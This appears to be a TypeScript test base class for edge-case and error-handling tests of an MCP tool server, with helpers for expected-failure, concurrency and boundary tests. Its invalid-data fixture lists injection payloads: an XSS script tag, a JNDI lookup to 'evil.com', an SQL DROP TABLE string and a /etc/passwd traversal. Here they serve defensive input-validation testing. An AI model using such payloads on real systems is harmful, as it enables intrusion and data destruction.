/**
 * Edge Case Test Base
 * Extends MCPTestBase with specialized utilities for edge case and error handling tests
 * Issue #649: Complete MCP Test Suite Implementation - Edge Cases & Error Handling
 */

import { MCPTestBase } from './mcp-test-base';
import { TestDataFactory } from './test-data-factory';
import type { CallToolResult } from '@modelcontextprotocol/sdk/types.js';

export interface EdgeCaseTestResult {
  test: string;
  passed: boolean;
  error?: string;
  executionTime?: number;
  expectedBehavior: 'error' | 'graceful_handling' | 'validation_failure';
  actualBehavior?: string;
}

export interface ConcurrencyTestConfig {
  concurrentCalls: number;
  delayBetweenCalls: number;
  expectedSuccesses: number;
  expectedFailures: number;
}

export abstract class EdgeCaseTestBase extends MCPTestBase {
  protected results: EdgeCaseTestResult[] = [];
  private testStartTime: number = 0;

  constructor(testPrefix: string) {
    super(testPrefix);
  }

  /**
   * Start timing a test execution
   */
  protected startTestTiming(): void {
    this.testStartTime = Date.now();
  }

  /**
   * End timing and return execution time in milliseconds
   */
  protected endTestTiming(): number {
    return Date.now() - this.testStartTime;
  }

  /**
   * Execute a test expecting an error or validation failure
   */
  async executeExpectedFailureTest(
    testName: string,
    toolName: string,
    params: Record<string, unknown>,
    expectedBehavior: 'error' | 'graceful_handling' | 'validation_failure',
    expectedErrorPatterns: string[] = []
  ): Promise<EdgeCaseTestResult> {
    this.startTestTiming();
    let passed = false;
    let error: string | undefined;
    let actualBehavior: string | undefined;

    try {
      const result = await this.executeToolCall(toolName, params);
      const text = this.extractTextContent(result).toLowerCase();

      // Analyze the actual behavior
      if (result.isError) {
        actualBehavior = 'error';
        passed =
          expectedBehavior === 'error' ||
          expectedBehavior === 'graceful_handling';
      } else if (this.hasError(result)) {
        actualBehavior = 'graceful_handling';
        passed =
          expectedBehavior === 'graceful_handling' ||
          expectedBehavior === 'error';
      } else if (this.hasValidationMessage(text)) {
        actualBehavior = 'validation_failure';
        passed =
          expectedBehavior === 'validation_failure' ||
          expectedBehavior === 'graceful_handling';
      } else {
        // Operation succeeded - this is acceptable for graceful_handling
        actualBehavior = 'success';
        passed = expectedBehavior === 'graceful_handling';
      }

      // Check for expected error patterns if provided (only if expecting error/validation)
      // Skip pattern check for graceful_handling since success is also acceptable
      if (
        expectedErrorPatterns.length > 0 &&
        actualBehavior !== 'success' &&
        expectedBehavior !== 'graceful_handling'
      ) {
        const hasExpectedPattern = expectedErrorPatterns.some((pattern) =>
          text.includes(pattern.toLowerCase())
        );
        if (!hasExpectedPattern) {
          // Don't fail if we got an error response, even without matching patterns
          if (!result.isError && !this.hasError(result)) {
            passed = false;
            error = `Expected error patterns not found: ${expectedErrorPatterns.join(', ')}`;
          }
        }
      }
    } catch (e) {
      actualBehavior = 'exception';
      error = e instanceof Error ? e.message : String(e);

      // Some exceptions are expected for certain test cases
      if (expectedBehavior === 'error' && this.isExpectedException(error)) {
        passed = true;
      }
    }

    const result: EdgeCaseTestResult = {
      test: testName,
      passed,
      error,
      executionTime: this.endTestTiming(),
      expectedBehavior,
      actualBehavior,
    };

    this.results.push(result);
    return result;
  }

  /**
   * Execute concurrent operations test
   */
  async executeConcurrencyTest(
    testName: string,
    toolName: string,
    paramsGenerator: () => Record<string, unknown>,
    config: ConcurrencyTestConfig
  ): Promise<EdgeCaseTestResult> {
    this.startTestTiming();
    let passed = false;
    let error: string | undefined;

    try {
      const promises: Promise<CallToolResult>[] = [];

      // Create concurrent calls with optional delays
      for (let i = 0; i < config.concurrentCalls; i++) {
        if (config.delayBetweenCalls > 0 && i > 0) {
          await new Promise((resolve) =>
            setTimeout(resolve, config.delayBetweenCalls)
          );
        }

        const params = paramsGenerator();
        promises.push(this.executeToolCall(toolName, params));
      }

      // Wait for all calls to complete
      const results = await Promise.allSettled(promises);

      // Analyze results
      const successes = results.filter(
        (r) => r.status === 'fulfilled' && !r.value.isError
      ).length;
      const failures = results.filter(
        (r) =>
          r.status === 'rejected' ||
          (r.status === 'fulfilled' && r.value.isError)
      ).length;

      // Validate against expected outcomes
      const successesMatch = successes >= config.expectedSuccesses;
      const failuresAcceptable = failures <= config.expectedFailures;

      passed = successesMatch && failuresAcceptable;

      if (!passed) {
        error = `Concurrency test failed: ${successes}/${config.expectedSuccesses} successes, ${failures}/${config.expectedFailures} failures`;
      }
    } catch (e) {
      error = e instanceof Error ? e.message : String(e);
    }

    const result: EdgeCaseTestResult = {
      test: testName,
      passed,
      error,
      executionTime: this.endTestTiming(),
      expectedBehavior: 'graceful_handling',
    };

    this.results.push(result);
    return result;
  }

  /**
   * Test boundary values (limits, maximums, etc.)
   */
  async executeBoundaryTest(
    testName: string,
    toolName: string,
    boundaryParams: Record<string, unknown>,
    expectedBehavior: 'error' | 'graceful_handling' | 'validation_failure'
  ): Promise<EdgeCaseTestResult> {
    return this.executeExpectedFailureTest(
      testName,
      toolName,
      boundaryParams,
      expectedBehavior,
      ['limit', 'maximum', 'boundary', 'too large', 'too long', 'exceeded']
    );
  }

  /**
   * Test with malformed or invalid input data
   */
  async executeInputValidationTest(
    testName: string,
    toolName: string,
    invalidParams: Record<string, unknown>,
    expectedBehavior: 'validation_failure' = 'validation_failure'
  ): Promise<EdgeCaseTestResult> {
    return this.executeExpectedFailureTest(
      testName,
      toolName,
      invalidParams,
      expectedBehavior,
      ['invalid', 'required', 'missing', 'malformed', 'validation']
    );
  }

  /**
   * Check if text contains validation-related messages
   */
  private hasValidationMessage(text: string): boolean {
    const validationPatterns = [
      'validation',
      'required',
      'missing',
      'invalid format',
      'malformed',
      'must be',
      'should be',
      'expected',
    ];

    return validationPatterns.some((pattern) => text.includes(pattern));
  }

  /**
   * Check if an exception is expected/acceptable for edge case testing
   */
  private isExpectedException(error: string): boolean {
    const expectedExceptionPatterns = [
      'invalid',
      'required',
      'not found',
      'malformed',
      'validation',
      'limit exceeded',
      'too large',
      'unauthorized',
    ];

    return expectedExceptionPatterns.some((pattern) =>
      error.toLowerCase().includes(pattern)
    );
  }

  /**
   * Generate invalid data patterns for testing
   *
   * ⚠️  WARNING: This method intentionally creates malformed/invalid data for error-path testing.
   * DO NOT use this data for normal test scenarios. Use TestDataFactory for valid test data.
   */
  protected generateInvalidData(): Record<string, unknown>[] {
    return [
      // Empty/null values
      { name: '', description: null },
      { name: null, description: '' },

      // Extremely long strings
      { name: 'A'.repeat(10000), description: 'B'.repeat(10000) },

      // Special characters and injection attempts
      {
        name: '<script>alert("xss")</script>',
        description: '${jndi:ldap://evil.com}',
      },
      {
        name: "'; DROP TABLE companies; --",
        description: '../../../etc/passwd',
      },

      // Invalid UUIDs
      { id: 'not-a-uuid', record_id: '123-invalid-uuid' },
      { id: '', record_id: 'obviously-not-a-uuid-format' },

      // Type mismatches
      { name: 12345, description: true },
      { name: [], description: {} },

      // Unicode edge cases
      { name: '🚀💻📊', description: '测试数据🔥' },
      { name: '\u0000\u0001\u0002', description: '\uFFFF\uFFFE' },
    ];
  }

  /**
   * Generate boundary test values
   */
  protected generateBoundaryValues(): Record<string, unknown>[] {
    return [
      // String length boundaries
      { name: 'A'.repeat(255), description: 'B'.repeat(1000) }, // Common DB limits
      { name: 'A'.repeat(65535), description: 'B'.repeat(65535) }, // TEXT field limits

      // Numeric boundaries
      { limit: -1, offset: -1 },
      { limit: 0, offset: 0 },
      { limit: Number.MAX_SAFE_INTEGER, offset: Number.MAX_SAFE_INTEGER },

      // Array boundaries
      { tags: [], categories: new Array(10000).fill('test') },

      // Date boundaries
      { created_at: '1900-01-01', updated_at: '2100-12-31' },
      { created_at: 'invalid-date', updated_at: 'not-a-date' },
    ];
  }

  /**
   * Get test results summary
   */
  getResultsSummary(): { passed: number; total: number; passRate: number } {
    const passed = this.results.filter((r) => r.passed).length;
    const total = this.results.length;
    const passRate = total > 0 ? (passed / total) * 100 : 0;

    return { passed, total, passRate };
  }

  /**
   * Clean up test data created during edge case testing
   * Tolerates expected errors like 404 (already deleted) and 400 (uniqueness conflicts)
   */
  async cleanupTestData(): Promise<void> {
    const trackedRecords = TestDataFactory.getTrackedRecords();
    if (trackedRecords.length === 0) {
      return;
    }

    console.log(`🧹 Cleaning up ${trackedRecords.length} tracked records...`);

    for (const record of trackedRecords) {
      try {
        const result = await this.executeToolCall('delete_record', {
          resource_type: record.type,
          record_id: record.id,
        });

        const text = this.extractTextContent(result);
        if (result.isError && !this.isExpectedCleanupError(text)) {
          console.warn(
            `⚠️ Cleanup issue for ${record.type} ${record.id}: ${text}`
          );
        } else {
          console.log(`✅ Deleted ${record.type}: ${record.id}`);
        }
      } catch (error) {
        // Tolerate cleanup errors during concurrent operations
        const errorMsg = error instanceof Error ? error.message : String(error);
        if (!this.isExpectedCleanupError(errorMsg)) {
          console.warn(
            `⚠️ Failed to delete ${record.type}: ${record.id}`,
            error
          );
        }
      }
    }

    // Clear the tracking array after attempting deletion
    TestDataFactory.clearTrackedRecords();
  }

  /**
   * Check if an error during cleanup is expected and can be ignored
   */
  private isExpectedCleanupError(errorText: string): boolean {
    const normalized = errorText.toLowerCase();
    return (
      normalized.includes('not found') ||
      normalized.includes('already deleted') ||
      normalized.includes('does not exist') ||
      normalized.includes('404') ||
      normalized.includes('400') ||
      normalized.includes('uniqueness') ||
      normalized.includes('conflict') ||
      normalized.includes('duplicate')
    );
  }

  /**
   * Validate edge case response with proper error checking
   * Replaces weak .toBeDefined() assertions
   */
  protected validateEdgeCaseResponse(
    response: CallToolResult,
    context: string,
    options: {
      expectError: boolean;
      errorIndicators?: string[];
      successIndicators?: string[];
      allowGracefulFallback?: boolean;
    }
  ): boolean {
    const responseText = this.extractTextContent(response);
    const normalizedText = responseText.toLowerCase();
    const hasError = this.hasError(response);

    const includesAny = (patterns: string[] | undefined): boolean => {
      if (!patterns || patterns.length === 0) return false;
      return patterns.some((pattern) =>
        normalizedText.includes(pattern.toLowerCase())
      );
    };

    if (options.expectError) {
      const matchedIndicator = includesAny(options.errorIndicators);
      const passed = hasError || matchedIndicator;

      if (!passed) {
        console.warn(
          `⚠️ ${context}: expected error but received "${responseText.substring(0, 100)}..."`
        );
      }

      return passed;
    }

    const successMatched = includesAny(options.successIndicators);
    const passed =
      !hasError && (successMatched || options.allowGracefulFallback === true);

    if (!passed) {
      console.warn(
        `⚠️ ${context}: expected success but received "${responseText.substring(0, 100)}..."`
      );
    }

    return passed;
  }

  /**
   * Log detailed results for analysis
   */
  logDetailedResults(): void {
    console.log('\n=== Edge Case Test Results ===');

    this.results.forEach((result) => {
      const status = result.passed ? '✅' : '❌';
      const timing = result.executionTime ? `(${result.executionTime}ms)` : '';

      console.log(`${status} ${result.test} ${timing}`);

      if (result.expectedBehavior !== result.actualBehavior) {
        console.log(
          `   Expected: ${result.expectedBehavior}, Actual: ${result.actualBehavior}`
        );
      }

      if (result.error) {
        console.log(`   Error: ${result.error}`);
      }
    });

    const summary = this.getResultsSummary();
    console.log(
      `\nSummary: ${summary.passed}/${summary.total} passed (${summary.passRate.toFixed(1)}%)`
    );
  }
}
